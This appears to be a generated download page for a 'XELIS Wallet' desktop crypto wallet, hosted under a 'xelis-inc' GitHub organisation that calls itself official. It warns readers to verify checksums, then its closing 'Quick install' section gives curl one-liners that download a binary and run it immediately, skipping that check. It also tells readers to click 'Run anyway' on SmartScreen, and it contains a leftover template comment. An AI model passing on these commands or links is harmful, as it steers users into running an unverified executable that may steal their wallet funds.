![XELIS Wallet for Windows: download, install and first launch](assets/banner-article.png)
# XELIS Wallet for Windows: download, install and first launch

Install the 64-bit build, clear SmartScreen and open your first wallet.

## Downloads - Windows

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the Windows installer from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1). The same page carries the macOS and Linux files, so a download that arrives from anywhere else is worth questioning before you run it.

> XELIS Wallet is the official XELIS desktop wallet and it never asks for your recovery phrase by email, chat or a support form.

The Windows build is a 64-bit installer for Windows 10 build 1909 or later and Windows 11. Download the `.exe` from the official release page, run it, and approve SmartScreen only after confirming the file came from that page. Then launch the app and create a new wallet or restore an existing one from its 25-word phrase.

<!-- ARTICLE-BODY-BEGIN -->
## What the installer expects from the machine

You need a 64-bit Windows 10 (1909) or Windows 11 machine, an account that can approve a desktop install, and enough free disk space for the app and its local wallet database. A 32-bit system or an older Windows build is the most common reason the installer refuses to start, and it is worth checking <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md">XELIS Wallet system requirements</a> before you download anything, because the wrong build behaves like a broken download.

The wallet connects to a XELIS node to read balances and broadcast transactions, so the install does not include the chain itself. Expect a small application and a first sync after you open a wallet, not a multi-gigabyte blockchain copy.

## Install XELIS Wallet on Windows

1. Open the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> and download the Windows `.exe` asset.
2. Confirm the file is the one you asked for by following the checksum step in the release notes.
3. Double-click the downloaded file. Windows may show a SmartScreen panel before the installer opens.
4. Choose More info, then Run anyway, but only if step 2 matched.
5. Follow the installer to the end. The default location is fine for a single-user machine.
6. Launch XELIS Wallet from the Start menu, then create a wallet or restore one from its phrase.

The checksum step is the one people skip, and it is the only check that catches a file modified after it was published. <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-official-download-check.md">check the official XELIS Wallet download</a> shows the command and the value to compare before you run the installer.

The whole sequence takes a few minutes on a normal connection. Nothing in the installer asks for an email address, a phone number or a login.

## If Windows stops the file

| Symptom | Likely cause | What to do |
| --- | --- | --- |
| SmartScreen says Windows protected your PC | The build is new or has few reputation signals yet | Check the source and hash first, then More info, Run anyway |
| Defender quarantines the file | Heuristic match on a new unsigned-looking binary | Verify the download, then restore it from quarantine |
| The installer closes with no message | Wrong architecture or an old Windows build | Confirm 64-bit and build 1909 or later, then re-download |
| Windows warns about an unknown publisher | Signing certificate not yet trusted on that machine | Only proceed after the hash matches the release |

A block is not proof of malware, and clicking through it is not proof of safety. The order matters: verify the file, then decide. If you are stuck on this screen, <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-antivirus-smartscreen-flagged.md">fix a XELIS Wallet antivirus warning</a> walks through the quarantine case without disabling protection.

## What a finished install looks like

After first launch you should see the wallet screen with an option to create a new wallet or restore an existing one. A wallet with no funds shows a zero balance and a receiving address, and sync progress settles once the node connection is established. If the app opens but stays empty or the balance never appears, the install worked and the problem is elsewhere.

## FAQ

### Can I install XELIS Wallet on Windows 10?

Yes, Windows 10 build 1909 or later on 64-bit is supported, along with Windows 11. Older builds and 32-bit systems are not.

### Why can't I find a separate Windows GUI download?

There is no separate GUI package. The Windows build in the download table above is the graphical app, and it is the same asset listed on the release page.

### Do I have to turn off my antivirus to install it?

No. Disabling protection to force an install removes the check that would catch a tampered file. Verify the hash, then allow the specific file if it is clean.

### Does the installer come with a wallet already set up?

No. The installer places the application on disk; the wallet is created on first launch, with its own local password and phrase.

### How does installing a crypto wallet work in general?

The pattern is always the same: get the installer from the project's release page, run it, then create or import a wallet. What separates a safe install from a risky one is whether you checked where the file came from.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet system requirements](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md)
- [Check the official XELIS Wallet download](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-official-download-check.md)
- [Create a XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-create-setup-password.md)
- [XELIS Wallet on macOS](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-macos-install-dmg.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
